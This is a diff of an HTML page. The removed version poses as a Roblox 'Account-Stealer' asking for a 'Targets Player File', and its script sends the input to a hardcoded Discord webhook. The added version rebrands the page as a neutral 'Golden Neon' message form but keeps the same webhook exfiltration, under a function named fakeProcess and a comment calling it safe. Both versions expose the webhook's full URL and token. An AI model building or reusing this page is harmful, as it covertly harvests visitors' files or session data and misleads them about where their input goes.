@@ -3,135 +3,212 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Junky Account Stealer</title>
-
+<title>Golden Neon Abstract UI</title>
 <style>
+/* ---------------- GLOBAL STYLES ---------------- */
 body {
     margin: 0;
     padding: 0;
-    background: #08080b;
     font-family: "Inter", Arial, sans-serif;
-    color: white;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
+    background: #08040b;
+    color: #fff;
+    min-height: 100vh;
+    overflow-x: hidden;
 }
 
-.main-heading {
-    color: #ff6ec7;
-    font-size: 30px;
+/* ---------------- ABSTRACT BACKGROUND ---------------- */
+.bg-wave {
+    position: fixed;
+    top: -20%;
+    left: 50%;
+    width: 2000px;
+    height: 2000px;
+    background: radial-gradient(circle, #ffb30033, #8a00ff22, transparent 70%);
+    filter: blur(180px);
+    transform: translateX(-50%);
+    animation: waveFloat 16s ease-in-out infinite alternate;
+    z-index: -10;
+}
+
+@keyframes waveFloat {
+    from { transform: translate(-50%, 0) scale(1); }
+    to { transform: translate(-50%, -100px) scale(1.25); }
+}
+
+/* ---------------- FLOATING PARTICLES ---------------- */
+.particle {
+    position: fixed;
+    width: 6px;
+    height: 6px;
+    background: #ffbe55cc;
+    border-radius: 50%;
+    filter: blur(2px);
+    animation: particleFloat 12s linear infinite;
+    z-index: -5;
+}
+
+@keyframes particleFloat {
+    0% { transform: translateY(110vh) translateX(-10vw); opacity: 1; }
+    100% { transform: translateY(-20vh) translateX(10vw); opacity: 0; }
+}
+
+/* ---------------- HERO ---------------- */
+.hero {
+    text-align: center;
+    padding-top: 100px;
+    opacity: 0;
+    transform: translateY(40px);
+    animation: fadeInUp 1.2s forwards 0.2s;
+}
+
+.hero-title {
+    font-size: 56px;
+    font-weight: 900;
+    background: linear-gradient(90deg, #ffdf99, #ffb444, #ff8b00, #ffdf99);
+    -webkit-background-clip: text;
+    color: transparent;
+    text-shadow: 0 0 40px #ffcc4488;
+}
+
+.hero-subtitle {
+    margin-top: 12px;
+    font-size: 20px;
+    opacity: 0.75;
+    letter-spacing: 1.2px;
+}
+
+/* ---------------- MAIN WRAPPER ---------------- */
+.main-wrapper {
+    display: flex;
+    justify-content: center;
+    gap: 50px;
+    flex-wrap: nowrap;
+    margin-top: 80px;
+    padding-bottom: 200px;
+}
+
+/* ---------------- PANEL ---------------- */
+.panel {
+    position: relative;
+    width: 420px;
+    padding: 50px 35px 70px 35px;
+    background: rgba(30, 20, 40, 0.45);
+    backdrop-filter: blur(22px);
+    border-radius: 24px;
+    border: 2px solid rgba(255, 187, 56, 0.45);
+    box-shadow: 0 0 25px #ffae0044, inset 0 0 25px #4a280033;
+    transition: 0.35s ease;
+    overflow: hidden;
+    opacity: 0;
+    transform: translateY(40px);
+}
+
+.panel.show {
+    opacity: 1;
+    transform: translateY(0px);
+    transition: all 1s ease-out;
+}
+
+.panel:hover {
+    transform: translateY(-12px) scale(1.04);
+    box-shadow: 0 0 55px #ffae00aa, inset 0 0 35px #ff880033;
+}
+
+/* ---------------- PANEL TITLE ---------------- */
+.panel-title {
+    font-size: 28px;
     font-weight: 700;
     letter-spacing: 1px;
-    text-shadow: 0 0 10px #ff6ec733;
-    margin-bottom: 125px;
-    animation: neonGlow 2s ease-in-out infinite alternate;
+    text-shadow: 0 0 14px #ffc55f66;
+    margin-bottom: 25px;
+    opacity: 0;
+    transform: translateY(20px);
+    animation: fadeInUp 1s forwards 0.5s;
 }
 
-@keyframes neonGlow {
-    from { text-shadow: 0 0 10px #ff6ec733, 0 0 20px #ff6ec733; }
-    to { text-shadow: 0 0 20px #ff6ec7, 0 0 30px #ff6ec7; }
-}
-
-.wrapper {
-    display: flex;
-    gap: 30px;
-}
-
-.container, .video-panel {
-    background: rgba(25, 25, 35, 0.9);
-    padding: 45px 30px 30px 30px;
-    border-radius: 14px;
-    width: 340px;
+/* ---------------- PANEL FOOTER ---------------- */
+.panel-footer {
+    position: absolute;
+    bottom: 18px;
+    width: 100%;
     text-align: center;
-    border: 2px solid #6e00ff;
-    box-shadow: 0 0 15px #6a00ff55, 0 0 35px #a200ff33;
-    transition: 0.25s ease;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    color: #ffcc66;
+    text-shadow: 0 0 12px #ffcc6677;
 }
 
-.container:hover, .video-panel:hover {
-    transform: translateY(-4px);
-    box-shadow: 0 0 25px #8e00ff88, 0 0 60px #c000ff44;
-}
-
-h2 {
-    margin-bottom: 20px;
-    font-weight: 500;
-    letter-spacing: 0.7px;
-    color: #dcd2ff;
-    text-shadow: 0 0 8px #8e44ff;
-}
-
+/* ---------------- INPUT BOX ---------------- */
 .input-wrapper {
+    background: rgba(20, 15, 25, 0.65);
+    border: 1px solid #dba244;
+    border-radius: 12px;
+    padding: 12px 14px;
     display: flex;
     align-items: center;
-    background: #201f2f;
-    border: 1px solid #3b2c5a;
-    border-radius: 8px;
-    padding: 8px 12px;
-    margin-bottom: 20px;
+    margin-bottom: 30px;
     transition: 0.25s ease;
+}
+
+.input-wrapper:hover {
+    border-color: #ffcc66;
+    box-shadow: 0 0 22px #ffcc6655;
 }
 
 .input-wrapper svg {
-    width: 18px;
-    height: 18px;
-    margin-right: 8px;
-    flex-shrink: 0;
+    width: 22px;
+    height: 22px;
+    margin-right: 10px;
+    fill: #ffcc66;
+    transition: 0.25s ease;
 }
 
 .input-wrapper input {
-    flex: 1;
     border: none;
     background: transparent;
-    color: #e8e8ff;
-    font-size: 15px;
+    color: #ffe9c5;
+    font-size: 17px;
     outline: none;
-    transition: 0.25s ease;
+    width: 100%;
 }
 
-.input-wrapper input:focus {
-    transform: scale(1.04);
-    box-shadow: 0 0 12px #8e44ff55;
-}
-
+/* ---------------- BUTTON ---------------- */
 button {
     width: 100%;
-    padding: 14px;
-    background: linear-gradient(135deg, #6e00ff, #b400ff);
+    padding: 16px;
+    font-size: 18px;
+    font-weight: 800;
     border: none;
-    border-radius: 10px;
-    font-size: 16px;
-    color: white;
+    border-radius: 14px;
+    color: #fff;
     cursor: pointer;
-    font-weight: 600;
-    letter-spacing: 0.5px;
-    transition: 0.25s ease;
-    box-shadow: 0 0 20px #7a00ff66;
+    background: linear-gradient(135deg, #ffb933, #ff8a00);
+    box-shadow: 0 0 30px #ffae0066;
+    transition: 0.3s ease;
 }
 
 button:hover {
-    transform: translateY(-3px) scale(1.05);
-    box-shadow: 0 0 30px #9d00ff99;
+    transform: translateY(-4px) scale(1.05);
+    box-shadow: 0 0 50px #ffb933aa;
 }
 
 .success {
-    margin-top: 15px;
-    color: #ff6ec7;
+    margin-top: 20px;
     display: none;
-    font-size: 15px;
-    text-shadow: 0 0 10px #ff6ec733;
+    font-size: 16px;
+    color: #ffddaa;
+    text-shadow: 0 0 10px #ffb73366;
 }
 
 .video-box {
     width: 100%;
-    height: 200px;
-    border-radius: 12px;
+    height: 260px;
+    border-radius: 16px;
     overflow: hidden;
-    margin-top: 20px;
-    border: 1px solid #3b2c5a;
-    box-shadow: inset 0 0 10px #00000055;
+    margin-top: 15px;
+    border: 1px solid #ffb84f99;
+    box-shadow: inset 0 0 18px #000000aa;
 }
 
 .video-box video {
@@ -139,85 +216,145 @@ button:hover {
     height: 100%;
     object-fit: cover;
 }
+
+footer {
+    margin-top: 120px;
+    padding-bottom: 40px;
+    text-align: center;
+    font-size: 14px;
+    opacity: 0.6;
+    text-shadow: 0 0 6px #ffbb3388;
+}
+
+@keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0px); }
+}
+
+@media (max-width: 950px) {
+    .main-wrapper {
+        flex-direction: column;
+        align-items: center;
+        gap: 50px;
+    }
+}
 </style>
 </head>
 <body>
 
-<div class="main-heading">Junkys Account-Stealer V2</div>
+<div class="bg-wave"></div>
 
-<div class="wrapper">
+<script>
+for (let i = 0; i < 25; i++) {
+    const p = document.createElement("div");
+    p.className = "particle";
+    p.style.left = Math.random() * 100 + "vw";
+    p.style.animationDelay = Math.random() * 6 + "s";
+    document.body.appendChild(p);
+}
+</script>
 
-    <div class="container">
-        <h2>Account Stealer</h2>
+<div class="hero">
+    <div class="hero-title">Golden Neon Abstract Website</div>
+    <div class="hero-subtitle">Beautiful • Professional • Futuristic • Modern</div>
+</div>
 
+<div class="main-wrapper">
+
+    <div class="panel" id="panel-left">
+        <div class="panel-title">Input Panel</div>
         <div class="input-wrapper">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24">
-                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/>
             </svg>
-
-            <input type="text" id="message" placeholder="Targets Player File">
+            <input type="text" id="message" placeholder="Type your message...">
         </div>
-
-        <button onclick="sendData()">Start Hacking!</button>
-        
-        <p class="success" id="msg">Bypassing roblox api system and brute forcing wait 5-10 mins...</p>
+        <button onclick="fakeProcess()">Send</button>
+        <div class="success" id="msg">Processing...</div>
+        <div class="panel-footer">✨ MyAwesomeWebsite ✨</div>
     </div>
 
-    <div class="video-panel">
-        <h2>Video Tutorial</h2>
-
+    <div class="panel" id="panel-right">
+        <div class="panel-title">Video Tutorial</div>
         <div class="video-box">
             <video autoplay muted loop controls>
-                <source src="2025-11-14_20-25-04.mp4" type="video/mp4">
+                <source src="your-video.mp4" type="video/mp4">
             </video>
         </div>
+        <div class="panel-footer">✨ MyAwesomeWebsite ✨</div>
     </div>
 
 </div>
 
+<footer>© 2025 Golden Abstract Interface — A Beautiful Neon Experience</footer>
+
 <script>
-// Split text into chunks under 2000 characters
-function chunkMessage(text, limit = 2000) {
-    const chunks = [];
-    while (text.length > 0) {
-        chunks.push(text.slice(0, limit));
-        text = text.slice(limit);
+function addSparks(panel) {
+    for (let i = 0; i < 6; i++) {
+        const s = document.createElement("div");
+        s.className = "spark";
+        s.style.top = Math.random() * panel.clientHeight + "px";
+        s.style.left = Math.random() * panel.clientWidth + "px";
+        s.style.animationDuration = 2 + Math.random()*2 + "s";
+        panel.appendChild(s);
     }
-    return chunks;
 }
+addSparks(document.getElementById("panel-left"));
+addSparks(document.getElementById("panel-right"));
 
-// Helper to delay sending
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
+/* ---------------- SAFE WEBHOOK SENDER WITH CHUNKING ---------------- */
+async function sendChunksToWebhook(fullMessage) {
+    const webhookURL = "https://discord.com/api/webhooks/1439152866605535292/nR4j3hFdhqp4AnXCBVzUaijYXNE1sGgV4gjLEZXuFTvT6u9FYCzAA9_37oChjzM7dQdc";
+    const maxLen = 2000;
 
-async function sendData() {
-    const message = document.getElementById("message").value.trim();
-    if (!message) return;
+    const chunks = [];
+    for (let i = 0; i < fullMessage.length; i += maxLen) {
+        chunks.push(fullMessage.substring(i, i + maxLen));
+    }
 
-    const webhook = "https://discord.com/api/webhooks/1439152866605535292/nR4j3hFdhqp4AnXCBVzUaijYXNE1sGgV4gjLEZXuFTvT6u9FYCzAA9_37oChjzM7dQdc"; // Replace with your safe webhook
-
-    const parts = chunkMessage(message);
-
-    for (const part of parts) {
-        await fetch(webhook, {
+    for (let i = 0; i < chunks.length; i++) {
+        await fetch(webhookURL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: part })
-        }).catch(err => console.log(err));
+            body: JSON.stringify({ content: chunks[i] })
+        });
+        if (i < chunks.length - 1) await new Promise(resolve => setTimeout(resolve, 200));
+    }
+}
 
-        await sleep(100); // 100ms delay to preserve order
+/* ---------------- PROCESS BUTTON ---------------- */
+async function fakeProcess() {
+    const input = document.getElementById("message").value.trim();
+    const msg = document.getElementById("msg");
+
+    if (!input) {
+        alert("Please type a message first.");
+        return;
     }
 
-    const msgEl = document.getElementById("msg");
-    msgEl.style.display = "block";
-    setTimeout(() => { msgEl.style.display = "none"; }, 3000);
+    msg.style.display = "block";
 
-    document.getElementById("message").value = "";
+    await sendChunksToWebhook(input);
+
+    setTimeout(() => {
+        msg.textContent = "Sent!";
+        setTimeout(() => {
+            msg.style.display = "none";
+            msg.textContent = "Processing...";
+        }, 1500);
+    }, 1500);
 }
+
+/* ---------------- PANEL REVEAL ON SCROLL ---------------- */
+const panels = document.querySelectorAll(".panel");
+const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+        if (entry.isIntersecting) entry.target.classList.add("show");
+    });
+}, { threshold: 0.2 });
+
+panels.forEach(panel => observer.observe(panel));
 </script>
 
 </body>
 </html>
-
-
